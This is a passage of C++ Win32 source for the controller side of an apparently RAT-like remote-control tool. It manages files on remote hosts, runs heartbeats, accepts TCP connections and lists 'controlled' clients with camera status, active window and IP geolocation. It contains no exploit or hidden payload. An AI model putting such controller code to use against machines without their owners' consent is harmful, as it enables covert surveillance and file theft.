                                std::lock_guard<std::mutex> lock(client->sendMutex);
                                send(client->socket, buffer.data(), (int)buffer.size(), 0);
                            }

                            std::wstring searchPath = lPath + L"\\*";
                            WIN32_FIND_DATAW ffd;
                            HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
                            if (hFind != INVALID_HANDLE_VALUE) {
                                do {
                                    if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;
                                    std::wstring newLocal = lPath + L"\\" + ffd.cFileName;
                                    std::wstring newRemote = rPath + L"\\" + ffd.cFileName;
                                    if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                                        uploadDir(newLocal, newRemote);
                                    } else {
                                        uploadFile(newLocal, newRemote);
                                    }
                                } while (FindNextFileW(hFind, &ffd) != 0);
                                FindClose(hFind);
                            }
                        };

                        for (const auto& name : selectedItems) {
                            std::wstring localItem = localBase;
                            if (localItem.back() != L'\\') localItem += L"\\";
                            localItem += name;

                            std::wstring remoteItem = remoteBase;
                            if (remoteItem.back() != L'\\') remoteItem += L"\\";
                            remoteItem += name;

                            DWORD attr = GetFileAttributesW(localItem.c_str());
                            if (attr != INVALID_FILE_ATTRIBUTES) {
                                if (attr & FILE_ATTRIBUTE_DIRECTORY) {
                                    uploadDir(localItem, remoteItem);
                                } else {
                                    uploadFile(localItem, remoteItem);
                                }
                            }
                        }
                        MessageBoxW(hDlg, L"文件/文件夹上传指令已全部发送完成。", L"文件管理", MB_OK | MB_ICONINFORMATION);
                        PostMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_GO_REMOTE, 0);
                    }).detach();
                }
            } else if (hFocus == hRemoteList) {
                // Remote -> Local (Download)
                std::vector<std::pair<std::wstring, bool>> items;
                int index = -1;
                while ((index = ListView_GetNextItem(hRemoteList, index, LVNI_SELECTED)) != -1) {
                    wchar_t name[MAX_PATH];
                    ListView_GetItemText(hRemoteList, index, 0, name, MAX_PATH);
                    
                    LVITEMW lvi = { 0 };
                    lvi.mask = LVIF_PARAM;
                    lvi.iItem = index;
                    ListView_GetItem(hRemoteList, &lvi);
                    items.push_back({ name, (lvi.lParam == 1) });
                }

                if (!items.empty()) {
                    std::wstring rBase = remotePath[hDlg];
                    std::wstring lBase = localPath[hDlg];
                    
                    std::thread([client, rBase, lBase, items, hDlg]() {
                        for (const auto& item : items) {
                            std::wstring rFile = rBase;
                            if (rFile.back() != L'\\') rFile += L"\\";
                            rFile += item.first;
                            
                            std::wstring lFile = lBase;
                            if (lFile.back() != L'\\') lFile += L"\\";
                            lFile += item.first;

                            if (item.second) {
                                // 递归下载文件夹
                                client->downloadRemoteBase = rFile;
                                client->downloadLocalBase = lFile;
                                SHCreateDirectoryExW(NULL, lFile.c_str(), NULL);

                                std::string sRemotePath = WideToUTF8(rFile);
                                CommandPkg pkg = { 0 };
                                pkg.cmd = CMD_FILE_DOWNLOAD_DIR;
                                size_t bodySize = sizeof(CommandPkg) - 1 + sRemotePath.size() + 1;
                                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                                PkgHeader* header = (PkgHeader*)buffer.data();
                                memcpy(header->flag, "FRMD26?", 7);
                                header->originLen = (int)bodySize;
                                header->totalLen = (int)buffer.size();
                                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                                pPkg->cmd = pkg.cmd;
                                memcpy(pPkg->data, sRemotePath.c_str(), sRemotePath.size() + 1);
                                
                                std::lock_guard<std::mutex> lock(client->sendMutex);
                                send(client->socket, buffer.data(), (int)buffer.size(), 0);
                            } else {
                                // 单文件下载
                                client->downloadPath = lFile;
                                if (client->downloadFile.is_open()) client->downloadFile.close();
                                client->downloadFile.open(lFile, std::ios::binary);

                                std::string sRemotePath = WideToUTF8(rFile);
                                CommandPkg pkg = { 0 };
                                pkg.cmd = CMD_FILE_DOWNLOAD;
                                size_t bodySize = sizeof(CommandPkg) - 1 + sRemotePath.size() + 1;
                                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                                PkgHeader* header = (PkgHeader*)buffer.data();
                                memcpy(header->flag, "FRMD26?", 7);
                                header->originLen = (int)bodySize;
                                header->totalLen = (int)buffer.size();
                                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                                pPkg->cmd = pkg.cmd;
                                memcpy(pPkg->data, sRemotePath.c_str(), sRemotePath.size() + 1);
                                
                                std::lock_guard<std::mutex> lock(client->sendMutex);
                                send(client->socket, buffer.data(), (int)buffer.size(), 0);
                            }
                            // 简单的延时以减少并发冲突 (由于是异步接收，这里无法完美同步，但线程化后至少不卡 UI)
                            Sleep(100); 
                        }
                        MessageBoxW(hDlg, L"文件/文件夹下载指令已全部发送完成。", L"文件管理", MB_OK | MB_ICONINFORMATION);
                    }).detach();
                }
            }
        } else if (LOWORD(wParam) == IDC_BTN_FILE_LAYOUT) {
            HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
            HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
            HWND hFocus = GetFocus();
            HWND hTarget = (hFocus == hLocalList) ? hLocalList : hRemoteList;

            DWORD style = GetWindowLong(hTarget, GWL_STYLE);
            if ((style & LVS_TYPEMASK) == LVS_REPORT) {
                SetWindowLong(hTarget, GWL_STYLE, (style & ~LVS_TYPEMASK) | LVS_ICON);
            } else {
                SetWindowLong(hTarget, GWL_STYLE, (style & ~LVS_TYPEMASK) | LVS_REPORT);
            }
            InvalidateRect(hTarget, NULL, TRUE);
        } else if (LOWORD(wParam) == IDC_BTN_FILE_DELETE) {
            HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
            HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
            HWND hFocus = GetFocus();
            
            if (hFocus == hRemoteList) {
                int count = ListView_GetSelectedCount(hRemoteList);
                if (count > 0) {
                    if (MessageBoxW(hDlg, (L"确定删除选中的 " + std::to_wstring(count) + L" 个远程项吗？").c_str(), L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                        int index = -1;
                        while ((index = ListView_GetNextItem(hRemoteList, index, LVNI_SELECTED)) != -1) {
                            wchar_t name[MAX_PATH];
                            ListView_GetItemText(hRemoteList, index, 0, name, MAX_PATH);
                            std::wstring fullPath = remotePath[hDlg];
                            if (fullPath.back() != L'\\') fullPath += L"\\";
                            fullPath += name;
                            
                            std::string path = WideToUTF8(fullPath);
                            CommandPkg pkg = { 0 };
                            pkg.cmd = CMD_FILE_DELETE;
                            
                            size_t bodySize = sizeof(CommandPkg) - 1 + path.size() + 1;
                            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                            PkgHeader* header = (PkgHeader*)buffer.data();
                            memcpy(header->flag, "FRMD26?", 7);
                            header->originLen = (int)bodySize;
                            header->totalLen = (int)buffer.size();
                            
                            CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                            pPkg->cmd = pkg.cmd;
                            memcpy(pPkg->data, path.c_str(), path.size() + 1);
                            
                            std::lock_guard<std::mutex> lock(client->sendMutex);
                            send(client->socket, buffer.data(), (int)buffer.size(), 0);
                        }
                        PostMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_GO_REMOTE, 0);
                    }
                }
            } else if (hFocus == hLocalList) {
                int count = ListView_GetSelectedCount(hLocalList);
                if (count > 0) {
                    if (MessageBoxW(hDlg, (L"确定删除选中的 " + std::to_wstring(count) + L" 个本地项吗？").c_str(), L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                        std::wstring fromPaths;
                        int index = -1;
                        while ((index = ListView_GetNextItem(hLocalList, index, LVNI_SELECTED)) != -1) {
                            wchar_t name[MAX_PATH];
                            ListView_GetItemText(hLocalList, index, 0, name, MAX_PATH);
                            std::wstring fullPath = localPath[hDlg];
                            if (fullPath.back() != L'\\') fullPath += L"\\";
                            fullPath += name;
                            fromPaths += fullPath + L'\0';
                        }
                        fromPaths += L'\0'; // Double null terminator
                        
                        SHFILEOPSTRUCTW fileOp = { 0 };
                        fileOp.hwnd = hDlg;
                        fileOp.wFunc = FO_DELETE;
                        fileOp.pFrom = fromPaths.c_str();
                        fileOp.fFlags = FOF_ALLOWUNDO | FOF_NOCONFIRMATION;
                        SHFileOperationW(&fileOp);
                        RefreshLocalFileList(hDlg, hLocalList, localPath[hDlg]);
                    }
                }
            }
        } else if (LOWORD(wParam) == IDC_BTN_FILE_MKDIR) {
            HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
            HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
            HWND hFocus = GetFocus();
            
            if (hFocus == hLocalList) {
                // Local Mkdir
                std::wstring path = localPath[hDlg];
                if (path.back() != L'\\') path += L"\\";
                path += L"新建文件夹";
                
                int i = 1;
                std::wstring base = path;
                while (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    path = base + L" (" + std::to_wstring(i++) + L")";
                }
                
                if (CreateDirectoryW(path.c_str(), NULL)) {
                    RefreshLocalFileList(hDlg, hLocalList, localPath[hDlg]);
                } else {
                    MessageBoxW(hDlg, L"创建本地文件夹失败", L"错误", MB_OK | MB_ICONERROR);
                }
            } else {
                // Remote Mkdir (Default)
                std::wstring path = remotePath[hDlg];
                if (path.back() != L'\\') path += L"\\";
                path += L"新建文件夹";
                
                std::string sPath = WideToUTF8(path);
                CommandPkg pkg = { 0 };
                pkg.cmd = CMD_FILE_MKDIR;
                
                size_t bodySize = sizeof(CommandPkg) - 1 + sPath.size() + 1;
                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                PkgHeader* header = (PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                
                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                pPkg->cmd = pkg.cmd;
                memcpy(pPkg->data, sPath.c_str(), sPath.size() + 1);
                
                std::lock_guard<std::mutex> lock(client->sendMutex);
                send(client->socket, buffer.data(), (int)buffer.size(), 0);
                
                PostMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_GO_REMOTE, 0);
            }
        } else if (LOWORD(wParam) == IDC_BTN_FILE_LAYOUT) {
            static bool sideBySide = false;
            sideBySide = !sideBySide;
            
            RECT rc;
            GetClientRect(hDlg, &rc);
            int width = rc.right;
            int height = rc.bottom;
            
            HWND hRemoteText = GetDlgItem(hDlg, IDC_STATIC); // Need to be careful with IDC_STATIC
            HWND hRemotePath = GetDlgItem(hDlg, IDC_EDIT_FILE_PATH_REMOTE);
            HWND hRemoteGo = GetDlgItem(hDlg, IDC_BTN_FILE_GO_REMOTE);
            HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
            
            HWND hLocalText = GetDlgItem(hDlg, IDC_STATIC); // This is tricky
            HWND hLocalPath = GetDlgItem(hDlg, IDC_EDIT_FILE_PATH_LOCAL);
            HWND hLocalGo = GetDlgItem(hDlg, IDC_BTN_FILE_GO_LOCAL);
            HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
            
            HWND hBtnSend = GetDlgItem(hDlg, IDC_BTN_FILE_SEND);
            HWND hBtnCopy = GetDlgItem(hDlg, IDC_BTN_FILE_COPY);
            HWND hBtnDel = GetDlgItem(hDlg, IDC_BTN_FILE_DELETE);
            HWND hBtnMkdir = GetDlgItem(hDlg, IDC_BTN_FILE_MKDIR);
            HWND hBtnLayout = GetDlgItem(hDlg, IDC_BTN_FILE_LAYOUT);

            if (sideBySide) {
                // Side-by-Side layout
                int halfWidth = (width - 20) / 2;
                MoveWindow(hRemotePath, 50, 10, halfWidth - 100, 20, TRUE);
                MoveWindow(hRemoteGo, 50 + halfWidth - 100 + 5, 9, 40, 22, TRUE);
                MoveWindow(hRemoteList, 10, 35, halfWidth, height - 80, TRUE);
                
                MoveWindow(hLocalPath, 10 + halfWidth + 50, 10, halfWidth - 100, 20, TRUE);
                MoveWindow(hLocalGo, 10 + halfWidth + 50 + halfWidth - 100 + 5, 9, 40, 22, TRUE);
                MoveWindow(hLocalList, 10 + halfWidth + 10, 35, halfWidth, height - 80, TRUE);
                
                // Move buttons to bottom
                int btnW = 60;
                int startX = (width - (btnW * 5 + 40)) / 2;
                MoveWindow(hBtnSend, startX, height - 35, btnW, 25, TRUE);
                MoveWindow(hBtnCopy, startX + btnW + 10, height - 35, btnW, 25, TRUE);
                MoveWindow(hBtnDel, startX + (btnW + 10) * 2, height - 35, btnW, 25, TRUE);
                MoveWindow(hBtnMkdir, startX + (btnW + 10) * 3, height - 35, btnW + 20, 25, TRUE);
                MoveWindow(hBtnLayout, startX + (btnW + 10) * 4 + 20, height - 35, btnW, 25, TRUE);
            } else {
                // Top-Bottom layout (Original style)
                int listH = (height - 110) / 2;
                MoveWindow(hRemotePath, 50, 10, width - 110, 20, TRUE);
                MoveWindow(hRemoteGo, width - 55, 9, 45, 22, TRUE);
                MoveWindow(hRemoteList, 10, 35, width - 20, listH, TRUE);
                
                int midY = 35 + listH + 10;
                MoveWindow(hBtnSend, 10, midY, 60, 25, TRUE);
                MoveWindow(hBtnCopy, 80, midY, 60, 25, TRUE);
                MoveWindow(hBtnDel, 150, midY, 60, 25, TRUE);
                MoveWindow(hBtnMkdir, 220, midY, 80, 25, TRUE);
                MoveWindow(hBtnLayout, 310, midY, 60, 25, TRUE);
                
                int localY = midY + 35;
                MoveWindow(hLocalPath, 50, localY, width - 110, 20, TRUE);
                MoveWindow(hLocalGo, width - 55, localY - 1, 45, 22, TRUE);
                MoveWindow(hLocalList, 10, localY + 25, width - 20, listH, TRUE);
            }
        } else if (LOWORD(wParam) == IDC_BTN_FILE_SEND) {
            // Local -> Remote (Upload)
            HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
            std::vector<std::wstring> selectedItems;
            int index = -1;
            while ((index = ListView_GetNextItem(hLocalList, index, LVNI_SELECTED)) != -1) {
                wchar_t name[MAX_PATH];
                ListView_GetItemText(hLocalList, index, 0, name, MAX_PATH);
                selectedItems.push_back(name);
            }

            if (!selectedItems.empty()) {
                std::wstring localBase = localPath[hDlg];
                std::wstring remoteBase = remotePath[hDlg];
                
                std::thread([client, localBase, remoteBase, selectedItems, hDlg]() {
                    // Helper lambda for recursive upload
                    std::function<void(const std::wstring&, const std::wstring&)> uploadDir;
                    
                    auto uploadFile = [&](const std::wstring& localFile, const std::wstring& remoteFile) {
                        std::ifstream file(localFile, std::ios::binary);
                        if (!file.is_open()) return;

                        std::string rPath = WideToUTF8(remoteFile);
                        CommandPkg pkg = { 0 };
                        pkg.cmd = CMD_FILE_UPLOAD;
                        pkg.arg2 = 0; // START
                        size_t bodySize = sizeof(CommandPkg) - 1 + rPath.size() + 1;
                        std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                        PkgHeader* header = (PkgHeader*)buffer.data();
                        memcpy(header->flag, "FRMD26?", 7);
                        header->originLen = (int)bodySize;
                        header->totalLen = (int)buffer.size();
                        CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                        pPkg->cmd = pkg.cmd;
                        pPkg->arg2 = 0;
                        memcpy(pPkg->data, rPath.c_str(), rPath.size() + 1);
                        {
                            std::lock_guard<std::mutex> lock(client->sendMutex);
                            send(client->socket, buffer.data(), (int)buffer.size(), 0);
                        }

                        char fileBuf[8192];
                        while (file.read(fileBuf, sizeof(fileBuf)) || file.gcount() > 0) {
                            size_t dataLen = (size_t)file.gcount();
                            size_t blockBodySize = sizeof(CommandPkg) - 1 + dataLen;
                            std::vector<char> blockBuffer(sizeof(PkgHeader) + blockBodySize);
                            PkgHeader* bHeader = (PkgHeader*)blockBuffer.data();
                            memcpy(bHeader->flag, "FRMD26?", 7);
                            bHeader->originLen = (int)blockBodySize;
                            bHeader->totalLen = (int)blockBuffer.size();
                            CommandPkg* bpPkg = (CommandPkg*)(blockBuffer.data() + sizeof(PkgHeader));
                            bpPkg->cmd = CMD_FILE_DATA;
                            bpPkg->arg1 = (uint32_t)dataLen;
                            memcpy(bpPkg->data, fileBuf, dataLen);
                            std::lock_guard<std::mutex> lock(client->sendMutex);
                            send(client->socket, blockBuffer.data(), (int)blockBuffer.size(), 0);
                        }
                        file.close();

                        pkg.arg2 = 1; // FINISH
                        {
                            std::lock_guard<std::mutex> lock(client->sendMutex);
                            send(client->socket, buffer.data(), (int)buffer.size(), 0);
                        }
                    };

                    uploadDir = [&](const std::wstring& localPath, const std::wstring& remotePath) {
                        // Create remote directory
                        {
                            std::string sRemotePath = WideToUTF8(remotePath);
                            CommandPkg pkg = { 0 };
                            pkg.cmd = CMD_FILE_MKDIR;
                            size_t bodySize = sizeof(CommandPkg) - 1 + sRemotePath.size() + 1;
                            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                            PkgHeader* header = (PkgHeader*)buffer.data();
                            memcpy(header->flag, "FRMD26?", 7);
                            header->originLen = (int)bodySize;
                            header->totalLen = (int)buffer.size();
                            CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                            pPkg->cmd = pkg.cmd;
                            memcpy(pPkg->data, sRemotePath.c_str(), sRemotePath.size() + 1);
                            std::lock_guard<std::mutex> lock(client->sendMutex);
                            send(client->socket, buffer.data(), (int)buffer.size(), 0);
                        }

                        std::wstring searchPath = localPath + L"\\*";
                        WIN32_FIND_DATAW ffd;
                        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
                        if (hFind != INVALID_HANDLE_VALUE) {
                            do {
                                if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;
                                std::wstring newLocal = localPath + L"\\" + ffd.cFileName;
                                std::wstring newRemote = remotePath + L"\\" + ffd.cFileName;
                                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                                    uploadDir(newLocal, newRemote);
                                } else {
                                    uploadFile(newLocal, newRemote);
                                }
                            } while (FindNextFileW(hFind, &ffd) != 0);
                            FindClose(hFind);
                        }
                    };

                    for (const auto& name : selectedItems) {
                        std::wstring localItem = localBase;
                        if (localItem.back() != L'\\') localItem += L"\\";
                        localItem += name;

                        std::wstring remoteItem = remoteBase;
                        if (remoteItem.back() != L'\\') remoteItem += L"\\";
                        remoteItem += name;

                        DWORD attr = GetFileAttributesW(localItem.c_str());
                        if (attr != INVALID_FILE_ATTRIBUTES) {
                            if (attr & FILE_ATTRIBUTE_DIRECTORY) {
                                uploadDir(localItem, remoteItem);
                            } else {
                                uploadFile(localItem, remoteItem);
                            }
                        }
                    }
                    PostMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_GO_REMOTE, 0);
                }).detach();
            }
        } else if (LOWORD(wParam) == IDC_BTN_FILE_COPY) {
            // Remote -> Local (Download)
            HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
            int index = -1;
            while ((index = ListView_GetNextItem(hRemoteList, index, LVNI_SELECTED)) != -1) {
                wchar_t name[MAX_PATH];
                ListView_GetItemText(hRemoteList, index, 0, name, MAX_PATH);
                
                std::wstring remoteFile = remotePath[hDlg];
                if (remoteFile.back() != L'\\') remoteFile += L"\\";
                remoteFile += name;
                
                // Set download context in client
                std::wstring fullLocalPath = localPath[hDlg];
                if (fullLocalPath.back() != L'\\') fullLocalPath += L"\\";
                fullLocalPath += name;

                client->downloadPath = fullLocalPath;
                if (client->downloadFile.is_open()) client->downloadFile.close();
                client->downloadFile.open(fullLocalPath, std::ios::binary);

                std::string rPath = WideToUTF8(remoteFile);
                CommandPkg pkg = { 0 };
                pkg.cmd = CMD_FILE_DOWNLOAD;
                
                size_t bodySize = sizeof(CommandPkg) - 1 + rPath.size() + 1;
                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                PkgHeader* header = (PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                pPkg->cmd = pkg.cmd;
                memcpy(pPkg->data, rPath.c_str(), rPath.size() + 1);
                
                std::lock_guard<std::mutex> lock(client->sendMutex);
                send(client->socket, buffer.data(), (int)buffer.size(), 0);
            }
        } else if (LOWORD(wParam) == IDCANCEL) {
            if (dlgToImageList.find(hDlg) != dlgToImageList.end()) {
                ImageList_Destroy(dlgToImageList[hDlg]);
                dlgToImageList.erase(hDlg);
            }
            EndDialog(hDlg, LOWORD(wParam));
            dlgToClientId.erase(hDlg);
            remotePath.erase(hDlg);
            localPath.erase(hDlg);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        if (dlgToImageList.find(hDlg) != dlgToImageList.end()) {
            ImageList_Destroy(dlgToImageList[hDlg]);
            dlgToImageList.erase(hDlg);
        }
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        remotePath.erase(hDlg);
        localPath.erase(hDlg);
        return (INT_PTR)TRUE;
    }
     return (INT_PTR)FALSE;
 }

 INT_PTR CALLBACK SettingsDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
        SetDlgItemTextW(hDlg, IDC_EDIT_LISTEN_PORT, ToWString(g_Settings.listenPort).c_str());
        return (INT_PTR)TRUE;
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDC_BTN_SAVE_SETTINGS) {
            wchar_t wPort[8];
            GetDlgItemTextW(hDlg, IDC_EDIT_LISTEN_PORT, wPort, 8);
            g_Settings.listenPort = _wtoi(wPort);
            SaveSettings();
            MessageBoxW(hDlg, L"设置已保存（重启生效）", L"提示", MB_OK | MB_ICONINFORMATION);
            EndDialog(hDlg, IDOK);
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

void HeartbeatThread() {
    while (true) {
        std::map<uint32_t, std::shared_ptr<ConnectedClient>> clientsCopy;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            clientsCopy = g_Clients;
        }
        for (auto& pair : clientsCopy) {
            auto& client = pair.second;
            if (client->active) {
                client->lastHeartbeatSendTime = GetTickCount64();
                SendSimpleCommand(pair.first, CMD_HEARTBEAT);
            }
        }
        Sleep(5000); // 每5秒发送一次心跳
    }
}

void NetworkThread() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr = { 0 };
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons((u_short)g_Settings.listenPort);
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        AddLog(L"错误", L"绑定端口失败: " + ToWString(WSAGetLastError()));
        closesocket(listenSocket);
        return;
    }
    listen(listenSocket, SOMAXCONN);
    while (true) {
        sockaddr_in clientAddr = { 0 };
        int addrSize = sizeof(clientAddr);
        SOCKET s = accept(listenSocket, (sockaddr*)&clientAddr, &addrSize);
        if (s != INVALID_SOCKET) {
            auto client = std::make_shared<ConnectedClient>();
            client->socket = s;
            client->addr = clientAddr;
            client->active = true;
            client->hScreen = NULL;
            client->isMonitoring = false;
            client->hProcessDlg = NULL;
            client->hModuleDlg = NULL;
            client->hTerminalDlg = NULL;
            client->hWindowDlg = NULL;
            uint32_t id = g_NextClientId++;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                g_Clients[id] = client;
            }
            std::thread(HandleClient, id, client).detach();
        }
    }
}
void HandleClient(uint32_t id, std::shared_ptr<ConnectedClient> client) {
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client->addr.sin_addr, ip, INET_ADDRSTRLEN);
    std::wstring wIP = ToWString(ip);
    UpdateStatusBar();
    
    while (client->active) {
        PkgHeader header;
        int n = recv(client->socket, (char*)&header, sizeof(PkgHeader), 0);
        if (n <= 0) break;
        if (memcmp(header.flag, "FRMD26?", 7) == 0) {
            std::vector<char> buffer(header.originLen);
            int total = 0;
            while (total < header.originLen) {
                int r = recv(client->socket, buffer.data() + total, header.originLen - total, 0);
                if (r <= 0) break;
                total += r;
            }
            if (header.originLen == sizeof(ClientInfo)) {
                memcpy(&client->info, buffer.data(), sizeof(ClientInfo));
                
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_TEXT | LVIF_PARAM;
                lvi.pszText = (LPWSTR)wIP.c_str();
                lvi.lParam = (LPARAM)id;
                
                SendMessageW(g_hListClients, WM_SETREDRAW, FALSE, 0);
                int index = ListView_InsertItem(g_hListClients, &lvi);
                
                std::wstring wPort = ToWString(ntohs(client->addr.sin_port));
                std::wstring wLAN = ToWString(client->info.lanAddr);
                std::wstring wComp = ToWString(client->info.computerName);
                std::wstring wOS = ToWString(client->info.osVersion);
                std::wstring wCPU = ToWString(client->info.cpuInfo);
                std::wstring wRTT = ToWString(client->info.rtt) + L"ms";
                std::wstring wVer = ToWString(client->info.version);
                std::wstring wInst = ToWString(client->info.installTime);
                std::wstring wUptime = ToWString(client->info.uptime);
                std::wstring wActWin = ToWString(client->info.activeWindow);
                std::wstring wType = (client->info.clientType == 0) ? L"被控端" : L"其他";

                ListView_SetItemText(g_hListClients, index, 1, (LPWSTR)wPort.c_str());
                ListView_SetItemText(g_hListClients, index, 2, (LPWSTR)wLAN.c_str());
                ListView_SetItemText(g_hListClients, index, 3, (LPWSTR)L"查询中...");
                ListView_SetItemText(g_hListClients, index, 4, (LPWSTR)wComp.c_str());
                ListView_SetItemText(g_hListClients, index, 5, (LPWSTR)wOS.c_str());
                ListView_SetItemText(g_hListClients, index, 6, (LPWSTR)wCPU.c_str());
                ListView_SetItemText(g_hListClients, index, 7, (LPWSTR)(client->info.hasCamera ? L"有" : L"无"));
                ListView_SetItemText(g_hListClients, index, 8, (LPWSTR)wRTT.c_str());
                ListView_SetItemText(g_hListClients, index, 9, (LPWSTR)wVer.c_str());
                ListView_SetItemText(g_hListClients, index, 10, (LPWSTR)wInst.c_str());
                ListView_SetItemText(g_hListClients, index, 11, (LPWSTR)wUptime.c_str());
                ListView_SetItemText(g_hListClients, index, 12, (LPWSTR)wActWin.c_str());
                ListView_SetItemText(g_hListClients, index, 13, (LPWSTR)wType.c_str());
                
                SendMessageW(g_hListClients, WM_SETREDRAW, TRUE, 0);
                client->listIndex = index;
                AddLog(L"上线通知", wIP + L" 已上线");

                // 异步查询地理位置
                std::thread([id, ip, client]() {
                    std::string location = GetLocationByIP(ip);
                    std::wstring wLoc = UTF8ToWide(location);
                    
                    // 确保在主线程更新 UI
                    struct UpdateData { uint32_t id; std::wstring loc; int index; };
                    UpdateData* data = new UpdateData{ id, wLoc, client->listIndex };
                    
                    PostMessageW(g_hMainWnd, WM_LOC_UPDATE, 0, (LPARAM)data);
                }).detach();
            } else {
                CommandPkg* pkg = (CommandPkg*)buffer.data();
                if (pkg->cmd == CMD_HEARTBEAT) {
                    if (pkg->arg1 == sizeof(ClientInfo)) {
                        ClientInfo* newInfo = (ClientInfo*)pkg->data;
                        uint64_t now = GetTickCount64();
                        int32_t rtt = (int32_t)(now - client->lastHeartbeatSendTime);

                        // 更新客户端信息 (RTT, 活动窗口, 系统运行时间)
                        memcpy(&client->info, newInfo, sizeof(ClientInfo));
                        client->info.rtt = rtt;

                        // 更新 UI 列表项
                        std::wstring wRTT = ToWString(rtt) + L"ms";
                        std::wstring wActWin = ToWString(client->info.activeWindow);
                        std::wstring wUptime = ToWString(client->info.uptime);

                        ListView_SetItemText(g_hListClients, client->listIndex, 8, (LPWSTR)wRTT.c_str());
                        ListView_SetItemText(g_hListClients, client->listIndex, 11, (LPWSTR)wUptime.c_str());
                        ListView_SetItemText(g_hListClients, client->listIndex, 12, (LPWSTR)wActWin.c_str());
                    }
                } else if (pkg->cmd == CMD_PROCESS_LIST) {
                    if (client->hProcessDlg && IsWindow(client->hProcessDlg)) {
                        HWND hList = GetDlgItem(client->hProcessDlg, IDC_LIST_PROCESS);
                        ListView_DeleteAllItems(hList);
                        
                        int count = pkg->arg1 / sizeof(ProcessInfo);
                        ProcessInfo* pInfo = (ProcessInfo*)pkg->data;
                        
                        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
                        for (int i = 0; i < count; i++) {
                            std::wstring wProcName = ToWString(pInfo[i].name);
                            LVITEMW lvi = { 0 };
                            lvi.mask = LVIF_TEXT | LVIF_PARAM;
                            lvi.iItem = i;
                            lvi.pszText = (LPWSTR)wProcName.c_str();
                            lvi.lParam = (LPARAM)pInfo[i].pid;
                            
                            int idx = ListView_InsertItem(hList, &lvi);
                            
                            std::wstring wPID = ToWString((int)pInfo[i].pid);
                            std::wstring wThreads = ToWString((int)pInfo[i].threads);
                            std::wstring wPriority = ToWString((int)pInfo[i].priority);
                            std::wstring wArch = ToWString(pInfo[i].arch);
                            std::wstring wOwner = ToWString(pInfo[i].owner);
                            std::wstring wPath = ToWString(pInfo[i].path);

                            ListView_SetItemText(hList, idx, 1, (LPWSTR)wPID.c_str());
                            ListView_SetItemText(hList, idx, 2, (LPWSTR)wThreads.c_str());
                            ListView_SetItemText(hList, idx, 3, (LPWSTR)wPriority.c_str());
                            ListView_SetItemText(hList, idx, 4, (LPWSTR)wArch.c_str());
                            ListView_SetItemText(hList, idx, 5, (LPWSTR)wOwner.c_str());
